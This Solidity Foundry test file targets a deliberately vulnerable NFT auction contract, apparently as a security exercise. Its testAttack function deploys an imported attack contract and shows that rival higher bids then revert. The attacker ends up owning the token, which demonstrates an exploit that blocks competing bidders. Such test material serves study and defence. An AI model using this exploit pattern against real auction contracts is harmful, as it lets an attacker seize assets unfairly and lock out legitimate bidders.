// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@ds-test/test.sol";
import "@forge-std/Vm.sol";
import "@forge-std/Test.sol";
import "@vulnerable/Auction.sol";
import "@malicious/AttackAuction.sol";

contract AuctionTest is DSTest {
    address myAddress = address(1);
    address lister = address(2);
    address lowBidder = address(3);

    Vm vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Auction auction = new Auction();
    MockERC721 mockERC721 = MockERC721(auction.nftContract());

    function setUp() public {
        vm.deal(myAddress, 10 ether);
        vm.deal(lister, 1 ether);
        vm.deal(lowBidder, 1 ether);
    }
    
    function test() public {
        vm.prank(lister);
        auction.list{value: 1 ether}();
        assertEq(auction.owner(0), address(lister));
    }
    
    function testMakingBid() public {
        vm.prank(lister);
        auction.list{value: 1 ether}();

        vm.prank(myAddress);
        auction.bid{value: 1.01 ether}(0);
    }

    function testBiddingLess() public {
        vm.prank(lister);
        auction.list{value: 1 ether}();

        vm.prank(myAddress);
        auction.bid{value: 1.5 ether}(0);

        vm.prank(lowBidder);
        vm.expectRevert("Auction: bid should be higher than minBidAmount");
        auction.bid{value: 1.0 ether}(0);
    }

    function testOutsideTime() public {
        vm.prank(lister);
        auction.list{value: 1 ether}();
        emit log_named_uint("Block timestamp", block.timestamp);

        vm.startPrank(myAddress);
        vm.warp(1000000);
        emit log_named_uint("Block timestamp after warp", block.timestamp);
        vm.expectRevert("Auction: period over");
        auction.bid{value: 1.5 ether}(0);
    }

    function testAttack() public {
        vm.prank(lister);
        auction.list{value: 1 ether}();
        emit log_named_uint("Block timestamp", block.timestamp);
        emit log_named_address("Token Owner after listing", mockERC721.ownerOf(0));

        vm.prank(myAddress);
        AuctionAttack attack = new AuctionAttack{value: 3 ether}(address(auction));

        emit log_named_address("Token Owner is", mockERC721.ownerOf(0));
        emit log_named_address("Auction address is", address(auction));
        emit log_named_address("Attack address is", address(attack));

        vm.prank(myAddress);
        attack.bid(0);
        emit log_named_address("Token Owner is", mockERC721.ownerOf(0));
        // Give our bidders some ETH.
        vm.deal(address(4), 4 ether);
        vm.deal(address(5), 5 ether);

        // This bid will fail
        vm.prank(address(4));
        vm.expectRevert();
        auction.bid{value: 3 ether}(0);

        // This bid will fail
        vm.prank(address(5));
        vm.expectRevert();
        auction.bid{value: 4 ether}(0);
        
        // Fast forward a week and collect.
        vm.warp(block.timestamp + 804800);
        vm.prank(myAddress);
        attack.collect(0);
        emit log_named_uint("Block timestamp", block.timestamp);
        emit log_named_address("Owner of token 0 is", mockERC721.ownerOf(0));
        assertEq(myAddress, mockERC721.ownerOf(0));
    }
}